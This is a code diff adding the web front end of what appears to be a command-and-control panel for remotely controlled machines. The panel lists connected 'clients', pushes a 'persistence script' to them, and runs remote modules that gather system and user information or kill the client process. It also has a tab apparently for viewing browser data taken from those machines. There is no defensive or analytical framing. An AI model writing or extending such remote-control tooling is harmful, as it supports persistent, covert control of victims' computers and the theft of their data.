+                        output.innerHTML += `<div class="output-entry"><span class="timestamp">[${timestamp}]</span> ${data.message}</div>`;
+                        if (data.status === 'success') {
+                            pollScriptResponse(data.request_id, output, statusEl);
+                            showNotification(`Persistence script sent to ${clientId}`);
+                        } else {
+                            statusEl.textContent = 'Error';
+                            statusEl.className = 'status-error';
+                            showNotification(data.message, 'error');
+                        }
+                    })
+                    .catch(error => {
+                        output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Error: ${error}</div>`;
+                        statusEl.textContent = 'Error';
+                        statusEl.className = 'status-error';
+                        showNotification('Error executing persistence command', 'error');
+                    });
+                }
+            } else if (command === 'list clients') {
+                fetch('/api/clients')
+                    .then(response => response.json())
+                    .then(data => {
+                        const clientList = data.clients.map(c => `${c.name} (${c.id}) - ${c.os} - ${c.status}`).join('\n');
+                        output.innerHTML += `<pre class="output-result">${clientList || 'No clients connected'}</pre>`;
+                        statusEl.textContent = 'Ready';
+                        statusEl.className = '';
+                    })
+                    .catch(error => {
+                        output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Error: ${error}</div>`;
+                        statusEl.textContent = 'Error';
+                        statusEl.className = 'status-error';
+                    });
+            } else if (command.startsWith('module ')) {
+                const parts = command.split(' ');
+                if (parts.length !== 3) {
+                    output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Invalid format. Use: module <module> <client-id></div>`;
+                    statusEl.textContent = 'Error';
+                    statusEl.className = 'status-error';
+                    showNotification('Invalid module command format', 'error');
+                } else {
+                    const moduleName = parts[1];
+                    const clientId = parts[2];
+                    if (!clientId.match(/\d{3}-\d{3}-\d{3}/)) {
+                        output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Invalid client ID format</div>`;
+                        statusEl.textContent = 'Error';
+                        statusEl.className = 'status-error';
+                        showNotification('Invalid client ID format', 'error');
+                    } else if (!['sysinfo', 'disconnect'].includes(moduleName)) {
+                        output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Unknown module: ${moduleName}</div>`;
+                        statusEl.textContent = 'Error';
+                        statusEl.className = 'status-error';
+                        showNotification(`Unknown module: ${moduleName}`, 'error');
+                    } else {
+                        fetch(`/api/run_script/${clientId}`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                shell: clientsData.find(c => c.id === clientId)?.os.includes('Windows') ? 'powershell' : 'bash',
+                                script: moduleName === 'sysinfo' ? 
+                                    (clientsData.find(c => c.id === clientId)?.os.includes('Windows') ? 'systeminfo' : 'ip a && whoami') :
+                                    (clientsData.find(c => c.id === clientId)?.os.includes('Windows') ? 'taskkill /F /IM python.exe' : 'pkill -f "python.*client.py"')
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            output.innerHTML += `<div class="output-entry"><span class="timestamp">[${timestamp}]</span> ${data.message}</div>`;
+                            if (data.status === 'success') {
+                                pollScriptResponse(data.request_id, output, statusEl);
+                                showNotification(`Module ${moduleName} sent to ${clientId}`);
+                                if (moduleName === 'disconnect') {
+                                    recentActivities.unshift({
+                                        type: 'disconnect',
+                                        message: 'Client Disconnected',
+                                        details: `Client ID: ${clientId} - Command: module disconnect`,
+                                        time: timestamp
+                                    });
+                                    if (recentActivities.length > 5) recentActivities.pop();
+                                    updateRecentActivity(clientsData, clientsData);
+                                }
+                            } else {
+                                statusEl.textContent = 'Error';
+                                statusEl.className = 'status-error';
+                                showNotification(data.message, 'error');
+                            }
+                        })
+                        .catch(error => {
+                            output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Error: ${error}</div>`;
+                            statusEl.textContent = 'Error';
+                            statusEl.className = 'status-error';
+                            showNotification('Error executing module command', 'error');
+                        });
+                    }
+                }
+            } else {
+                output.innerHTML += `<div class="output-entry error"><span class="timestamp">[${timestamp}]</span> Unknown command</div>`;
+                statusEl.textContent = 'Error';
+                statusEl.className = 'status-error';
+                showNotification('Unknown command', 'error');
+            }
+            output.scrollTop = output.scrollHeight;
+            input.value = '';
+        }
+
+        // Client data polling
+        let lastTimestamp = 0;
+        let previousClients = [];
+        let clientsData = [];
+        
+        function fetchClientData() {
+            fetch('/api/clients')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.timestamp > lastTimestamp) {
+                        lastTimestamp = data.timestamp;
+                        clientsData = data.clients;
+                        updateDashboardStats(data.totalClients, data.activeSessions, data.pendingTasks);
+                        updateClientList(data.clients, previousClients);
+                        previousClients = [...data.clients];
+                    }
+                })
+                .catch(error => console.error('Error fetching client data:', error));
+        }
+
+        fetchClientData();
+        setInterval(fetchClientData, 2000);
+
+        // Close dropdown when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!notificationsBtn.contains(e.target) && !notificationsDropdown.contains(e.target)) {
+                notificationsDropdown.classList.remove('visible');
+            }
+        });
+
+        // Data tab switching
+        const dataTabs = document.querySelectorAll('.data-tab');
+        const tabContents = document.querySelectorAll('.data-content .tab-content');
+
+        dataTabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                dataTabs.forEach(t => t.classList.remove('active'));
+                tabContents.forEach(c => c.style.display = 'none');
+                
+                tab.classList.add('active');
+                document.getElementById(`${tab.dataset.tab}-content`).style.display = 'block';
+            });
+        });
+
+        // Data select event listeners
+        document.getElementById('data-client-select').addEventListener('change', updateDataDisplay);
+        document.getElementById('browser-select').addEventListener('change', updateDataDisplay);
+
+        // Console input enter key
+        document.getElementById('console-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                executeConsoleCommand();
+            }
+        });
+    </script>
+</body>
+</html>
